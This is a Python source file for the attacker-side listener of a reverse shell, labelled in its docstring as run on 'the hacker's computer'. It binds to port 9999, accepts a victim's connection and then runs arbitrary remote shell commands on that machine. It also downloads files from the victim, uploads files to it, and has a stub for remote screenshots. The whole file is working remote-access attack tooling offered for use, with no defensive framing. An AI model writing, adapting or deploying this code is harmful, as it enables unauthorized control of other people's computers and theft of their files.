import socket, os, io

__author__ = "Marcio Castillo"
__license__ = "MIT"

'''
    This script is ran on the hacker's computer.
'''

IDENTIFIER = "<END_OF_COMMAND_RESULT>"
eof_identifier = "<END_OF_FILE_IDENTIFIER>"
CHUNK_SIZE = 2048

if __name__ == "__main__":
    hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    hacker_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    IP = "************"
    Port = 9999
    socket_address = (IP, Port)
    hacker_socket.bind(socket_address)
    hacker_socket.listen(5)
    print("Listening for incoming connection requests")
    hacker_socket, client_address = hacker_socket.accept()

    try:
        print("Connected to:", client_address)
        while True:
            command = input("Enter the command ~> ")
            hacker_socket.send(command.encode())
            
            # exit 
            if command == "stop" or command == "exit":
                hacker_socket.close()
                break

            elif command == ""  or command.strip() == "":
                continue
            
            # change directory on remote host
            elif command.startswith("cd"):
                res = hacker_socket.recv(1024)
                print(res.decode())
                continue

            # get file from remote host
            elif command.startswith("get"):
                file_name = command.replace("get ", "")
                exists = hacker_socket.recv(1024) # yes:filesize or no
                print("exits ?", exists.decode())
                if exists.decode().startswith("yes"):
                    filesize = exists.decode().split(":")[1]
                    with io.open(file_name, "wb") as f:
                        while True:
                            bytes_read = hacker_socket.recv(4096)
                            print("bytes ~>", bytes_read)
                            if bytes_read.endswith(eof_identifier.encode()):    
                                bytes_read = bytes_read[:-len(eof_identifier)]
                                f.write(bytes_read)
                                f.close()
                                break
                            f.write(bytes_read)
                    print("Download complete")
                    continue
                else:
                    print("Remote file not found")
                    continue
            
            # set file from local to remote host
            elif command.startswith("set"):
                file_to_send = command.replace("set ", "")
                if os.path.exists(file_to_send):
                    with open(file_to_send, "rb") as f:
                            chunk = f.read(CHUNK_SIZE)
                            while len(chunk) > 0:
                                hacker_socket.send(chunk)
                                chunk = f.read(CHUNK_SIZE)
                            hacker_socket.send(eof_identifier.encode())
                    print("File has been sent to victim")
                    continue

                else:
                    print("File doesn't exist")
                    continue
            
            # takes screenshot on remote host
            elif command.startswith("screenshot"):
                print("Attemping to take screenshot")
                continue
            
            # calls remote terminal commands
            else:
                full_command_result = b''
                while True:
                    chunk = hacker_socket.recv(1048)
                    if chunk.endswith(IDENTIFIER.encode()):
                        chunk = chunk[:-len(IDENTIFIER)]
                        full_command_result += chunk
                        break
                    full_command_result += chunk
                print(full_command_result.decode())

    except Exception as err:
        print("Exception occured:", err)
        hacker_socket.close()